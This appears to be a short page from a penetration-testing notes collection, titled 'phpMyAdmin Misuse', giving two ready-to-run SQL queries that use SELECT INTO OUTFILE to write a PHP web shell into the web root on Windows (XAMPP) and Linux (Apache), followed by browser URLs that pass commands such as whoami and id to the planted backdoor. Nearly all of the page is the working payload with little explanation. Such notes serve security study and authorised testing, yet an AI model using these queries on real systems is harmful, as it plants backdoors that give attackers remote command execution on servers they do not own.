# phpMyAdmin Misuse

```
Description: PHP application that lets you interact with a MySQL database through your web browser
Hosted: http://<host>/phpmyadmin

# Windows Example (XAMPP or WAMP or LAMP)
# Query to execute
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:\\xampp\\htdocs\\backdoor.php";

Browser: http://<victim-ip>/backdoor.php?cmd=whoami
```

# Linux Example (Apache default path)
```
# Query to execute
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php";

Browser: http://<victim-ip>/shell.php?cmd=id
```

## Back to README.md
[BACK](../README.md)